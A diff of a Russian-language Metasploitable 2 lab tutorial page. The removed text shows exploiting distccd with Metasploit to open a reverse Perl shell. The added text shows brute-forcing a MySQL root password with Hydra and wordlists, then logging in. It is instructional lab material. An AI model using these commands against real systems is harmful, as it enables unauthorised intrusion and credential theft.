@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Эксплуатируем уязвимость distccd в metasploitable-linux-2.0.0</title>
+	<title>Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0</title>
 
-	<meta name="DESCRIPTION" content="Эксплуатируем уязвимость distccd в metasploitable-linux-2.0.0">
-	<meta name="KEYWORDS" content="Эксплуатируем уязвимость distccd в metasploitable-linux-2.0.0">
+	<meta name="DESCRIPTION" content="Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0">
 
   <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2o.html" />
   <meta property="og:type"               content="article" />
-  <meta property="og:title"              content="Ed Kurlyak - Эксплуатируем уязвимость distccd в metasploitable-linux-2.0.0" />
-  <meta property="og:description"        content="Эксплуатируем уязвимость distccd в metasploitable-linux-2.0.0" />
+  <meta property="og:title"              content="Ed Kurlyak - Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0" />
   <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
 
 <style type="text/css">
@@ -49,7 +49,7 @@ p {
 <body>
 
 <h3>
-Часть 15. Эксплуатируем уязвимость distccd в metasploitable-linux-2.0.0
+Часть 15. Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0
 </h3>
 
 <p>
@@ -120,211 +120,7 @@ ping 10.0.2.3
 </p>
 
 <p>
-На Kali выполняем команду в терминале что бы найти distccd:
-</p>
-
-<p>
-nmap -sV -p3632 10.0.2.3
-</p>
-
-<p>
-В выводе nmap находим такую строку (сриншот ниже):
-</p>
-
-<p>
-3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
-</p>
-
-<p>
-Это значит на порту 3632 открыта служба distccd (скриншот ниже).
-</p>
-
-<img src="./pico/pic120.jpg" width=1400 alt="kali linux терминал вывод команды nmap">
-
-<p>
-Запускаем консоль метсплоит:
-</p>
-
-<p>
-msfconsole
-</p>
-
-<p>
-После запуска метасплоит даем команду поиска distccd:
-</p>
-
-<p>
-msf > search distccd
-</p>
-
-
-<p>
-Нам выдало модуль (скриншот ниже):
-</p>
-
-<p>
-0  exploit/unix/misc/distcc_exec
-</p>
-
-
-<img src="./pico/pic121.jpg" width=1400 alt="kali linux терминал msfconsole search">
-
-<p>
-Даем команды:
-</p>
-
-<p>
-msf > use exploit/unix/misc/distcc_exec
-<br>
-msf > show payloads
-<br>
-msf > set PAYLOAD cmd/unix/reverse_perl
-</p>
-
-<img src="./pico/pic122.jpg" width=1400 alt="kali linux терминал msfconsole команды show payloads set payload">
-
-<p>
-Затем команды:
-</p>
-
-<p>
-set RHOSTS 10.0.2.3
-<br>
-set LHOST 10.0.2.4
-<br>
-run
-</p>
-
-<p>
-После установления сессии даем команду ifconfig (скриншот ниже) и видим мы на удаленной машине 10.0.2.3, мы получили обычную командную оболочку (shell). Нажимаем Ctrl + C и затем y для выхода из сессии.
-</p>
-
-<img src="./pico/pic123.jpg" width=1400 alt="kali linux терминал msfconsole команды set run">
-
-<p>
-Теперь теория.
-</p>
-
-<p>
-Что такое distcc и distccd?
-</p>
-
-<p>
-distcc (Distributed C Compiler) — это программа, которая позволяет распределять компиляцию C/C++ программ между несколькими компьютерами в сети.
-</p>
-
-<p>
-Представте, что у нас есть 10 компьютеров.
-</p>
-
-<p>
-Вместо того чтобы один компьютер компилировал проект 20 минут, можно разделить работу:
-</p>
-
-<p>
-компьютер №1 компилирует первые файлы;
-<br>
-компьютер №2 — вторые;
-<br>
-компьютер №3 — третьи.
-</p>
-
-<p>
-В результате сборка заканчивается гораздо быстрее.
-</p>
-
-<p>
-Что такое distccd?
-</p>
-
-<p>
-Последняя буква d означает daemon (демон).
-</p>
-
-<p>
-То есть:
-</p>
-
-<p>
-distcc — клиент;
-<br>
-distccd — сервер (демон), который принимает задания на компиляцию.
-</p>
-
-<p>
-Он обычно слушает TCP-порт 3632.
-</p>
-
-<p>
-Команда
-</p>
-
-<p>
-set PAYLOAD cmd/unix/reverse_perl
-</p>
-
-<p>
-означает, что будет использоваться Perl для создания обратного подключения.
-</p>
-
-<p>
-Какая получится сессия?
-</p>
-
-<p>
-Если всё пройдет успешно, мы получим обычную командную оболочку (shell).
-</p>
-
-<p>
-Чем например reverse_perl отличается от reverse_bash?
-</p>
-
-<p>
-Разница только в том, какая программа создает обратное TCP-соединение:
-</p>
-
-<p>
-cmd/unix/reverse_bash — использует Bash.
-<br>
-cmd/unix/reverse_perl — использует Perl.
-<br>
-cmd/unix/reverse_python — использует Python.
-<br>
-cmd/unix/reverse_netcat — использует Netcat.
-<br>
-cmd/unix/reverse — использует другой доступный способ, в зависимости от реализации.
-</p>
-
-<p>
-После успешного подключения результат обычно одинаковый — обычная shell-сессия.
-</p>
-
-<p>
-Разберем эту строку полностью.
-</p>
-
-<p>
-3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
-</p>
-
-<p>
-На TCP-порту 3632 работает сервер distccd. Порт открыт. Сервер использует протокол distccd версии 1 и настроен для работы с GNU GCC 4.2.4, установленным из пакета Ubuntu 4.2.4-1ubuntu4.
-</p>
-
-<p>
-Почему (для обнаружения) команда nmap -sC -sV 10.0.2.3 не покажет distccd (port 3632) но команда nmap -sV -p3632 10.0.2.3 показала.
-</p>
-
-<p>
-Причина в том, как именно работает Nmap.
-</p>
-
-<p>
-Разберем по шагам.
-</p>
-
-<p>
-Первый случай
+На Kali выполняем команду в терминале:
 </p>
 
 <p>
@@ -332,143 +128,133 @@ nmap -sC -sV 10.0.2.3
 </p>
 
 <p>
-Мы не указали порты.
+В выводе nmap находим такую строку (сриншот ниже):
 </p>
 
 <p>
-Тогда Nmap делает следующее:
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
 </p>
 
 <p>
-Берет список 1000 самых популярных TCP-портов.
+Открыт 3306 порт и на нем служба MySQL.
 </p>
 
-<p>
-Проверяет только их.
-</p>
-
-<p>
-На найденных открытых портах запускает:
-</p>
-
-<p>
--sV — определение версии сервиса;
 <br>
--sC — стандартные NSE-скрипты.
+
+<img src="./pico/pic114.jpg" width=1400 alt="kali linux терминал команда nmap">
+
+<p>
+Еще один способ определить версию MySQL.
 </p>
 
 <p>
-Возникает вопрос:
+Запускаем метсплоит:
 </p>
 
 <p>
-А входит ли порт 3632 в эти 1000 популярных?
+msfconsole
 </p>
 
 <p>
-Нет. Обычно порт 3632 не входит в список Top 1000 TCP-портов Nmap.
+msf > use auxiliary/scanner/mysql/mysql_version
+<br>
+msf auxiliary(scanner/mysql/mysql_version) > set RHOSTS 10.0.2.3
+<br>
+msf auxiliary(scanner/mysql/mysql_version) > run
+</p>
+
+<img src="./pico/pic115.jpg" width=1400 alt="kali linux терминал msfconsole run">
+
+<p>
+Вывод на скриншоте выше так же определил версию MySQL:
 </p>
 
 <p>
-Поэтому Nmap его вообще не проверял.
+10.0.2.3:3306 is running MySQL 5.0.51a-3ubuntu5
 </p>
 
 <p>
-Второй случай
+Далее будем подбирать пароль к MySQL для пользователя root.
 </p>
 
 <p>
-nmap -sV -p3632 10.0.2.3
+Дадим команду в терминале Kali распаковать словарь их архива:
 </p>
 
 <p>
-Здесь мы сказали:
+gunzip /usr/share/wordlists/rockyou.txt.gz
 </p>
 
 <p>
-Проверяй именно порт 3632.
+Если использовать брутфорс из метасплоит, то новая версия метасплоит плохо работает со старой версией MySQL на удаленной машине, но кто хочет может попробывать такие команды (можно так же установить старую версию Kali и метасплоит):
 </p>
 
 <p>
-Nmap сразу подключился к нему.
+msf > use auxiliary/scanner/mysql/mysql_login
+<br>
+msf auxiliary(mysql_login) > set RHOSTS 10.0.2.3
+<br>
+msf auxiliary(mysql_login) > set USER_FILE /usr/share/wordlists/rockyou.txt
+<br>
+msf auxiliary(mysql_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+<br>
+msf auxiliary(mysql_login) > run
 </p>
 
 <p>
-Порт оказался открыт.
+После запуска run у меня вылетает ошибка, как на скриншоте ниже:
+</p>
+
+<img src="./pico/pic116.jpg" width=1400 alt="kali linux терминал msfconsole run">
+
+<p>
+Завершаем работу с метасплоит командой exit.
 </p>
 
 <p>
-После этого -sV определил:
+Поэтому для подбора пароля к MySQL используем программу Hydra.
 </p>
 
 <p>
-3632/tcp open distccd
+Ниже две команды- эти команды аналогичны, разница в том что для подбора пароля используют разные словари.
+<p>	
+
+<p>
+hydra -l root -e n -P /usr/share/wordlists/rockyou.txt -t 32 mysql://10.0.2.3:3306 -V
 </p>
 
 <p>
-Почему так сделано?
+hydra -l root -P /usr/share/wordlists/fasttrack.txt -t 32 mysql://10.0.2.3:3306 -V
 </p>
 
 <p>
-Потому что проверять все 65535 портов долго.
+Для примера возьмем первую команду и введем в терминал Kali (скриншот ниже):
+</p>
+
+<img src="./pico/pic117.jpg" width=1400 alt="kali linux терминал hydra">
+
+<p>
+Если пароль пустой (empty password), то Hydra часто выводит только найденный логин, без текста пароля, например:
 </p>
 
 <p>
-Поэтому по умолчанию Nmap делает компромисс:
-</p>
-
-<pre>
-
-65535 портов
-        │
-        │
-        ▼
-Top 1000 наиболее часто используемых
-
-</pre>
-
-<p>
-В большинстве случаев этого достаточно.
+[3306][mysql] host: 10.0.2.3   login: root
 </p>
 
 <p>
-Как проверить все порты?
+Это означает, что пароль — пустая строка ("").
 </p>
 
 <p>
-Используют
+Почему Hydra так делает
 </p>
 
 <p>
-nmap -p- 10.0.2.3
+Hydra считает пустой пароль отдельным случаем и не печатает что-то вроде
 </p>
 
 <p>
--p- означает
-</p>
-
-<p>
-Проверить все TCP-порты от 1 до 65535.
-</p>
-
-<p>
-Тогда Nmap обязательно найдет:
-</p>
-
-<p>
-3632/tcp open distccd
-</p>
-
-<p>
-Можно совместить с определением сервисов
-</p>
-
-<p>
-Например
-</p>
-
-<p>
-nmap -p- -sV 10.0.2.3
+password:
 </p>
 
 <p>
@@ -476,43 +262,122 @@ nmap -p- -sV 10.0.2.3
 </p>
 
 <p>
-nmap -p- -sC -sV 10.0.2.3
+password: ""
 </p>
 
 <p>
-Тогда сначала будут найдены все открытые порты, а затем для каждого из них Nmap определит сервис и его версию.
+потому что выводить нечего.
+</p>
+
+
+<p>
+В нашем выводе видим- пароль пустая строка.
 </p>
 
 <p>
-Как узнать, входит ли порт в Top 1000?
+Мы узнали пароль, теперь заходим в MySQL.
 </p>
 
 <p>
-Можно посмотреть базу данных Nmap:
+Ниже две команды заходы в MySQL, можно взять любую:
 </p>
 
 <p>
-grep 3632 /usr/share/nmap/nmap-services
+mysql --skip-ssl -h 10.0.2.3 -u root
+</p>
+
+
+<p>
+mysql --skip-ssl -h 10.0.2.3 -u root -p
 </p>
 
 <p>
-или найти его ранг. Если порт имеет очень низкую распространенность, он не попадет в Top 1000 и не будет просканирован командой без явного указания диапазона портов.
+В случае с ключем -p при запросе пароля нажать клавишу Enter и MySQL продолжит работу.
+</p>
+
+<img src="./pico/pic118.jpg" width=1400 alt="kali linux терминал mysql">
+
+<br>
+<br>
+
+<img src="./pico/pic119.jpg" width=1400 alt="kali linux терминал mysql">
+
+<p>
+Hydra — это инструмент для подбора учетных данных (логина и пароля) к различным сетевым сервисам.
 </p>
 
 <p>
-Итог
+Она может работать двумя основными способами:
 </p>
 
 <p>
-Именно поэтому будут разные результаты:
+1)Перебор по словарю (dictionary attack) — берет пароли из файла и проверяет их один за другим.
 </p>
 
 <p>
-nmap -sC -sV 10.0.2.3 → 3632 даже не сканировался, потому что не входит в список проверяемых по умолчанию портов.
+Например:
 </p>
 
 <p>
-nmap -sV -p3632 10.0.2.3 → порт был проверен явно, поэтому сервис distccd был обнаружен.
+hydra -l root -P /usr/share/wordlists/fasttrack.txt mysql://10.0.2.3
+</p>
+
+<p>
+Здесь:
+</p>
+
+<p>
+-l root — логин root;
+<br>
+-P fasttrack.txt — список возможных паролей;
+<br>
+mysql://10.0.2.3 — сервер MySQL.
+</p>
+
+<p>
+2)Проверка специальных вариантов паролей с помощью -e:
+</p>
+
+<p>
+n — пустой пароль;
+<br>
+s — пароль совпадает с логином;
+<br>
+r — пароль равен логину, записанному наоборот.
+</p>
+
+<p>
+Например:
+</p>
+
+<p>
+hydra -l root -e ns mysql://10.0.2.3
+</p>
+
+<p>
+сначала попробует пустой пароль, затем пароль root.
+</p>
+
+<p>
+Что происходит внутри
+</p>
+
+<p>
+Hydra не "угадывает" пароль математически. Она:
+</p>
+
+<p>
+подключается к серверу;
+<br>
+отправляет логин и очередной пароль;
+<br>
+если сервер отвечает «неверный пароль» — пробует следующий;
+<br>
+если сервер принимает пароль — сообщает об успехе и (по умолчанию) прекращает подбор для этого логина.
+</p>
+
+<p>
+Такой метод называется брутфорс (brute force) или, если используется словарь, словарная атака (dictionary attack). Словарная атака обычно значительно быстрее полного перебора всех возможных комбинаций символов.
 </p>
 
 </body>
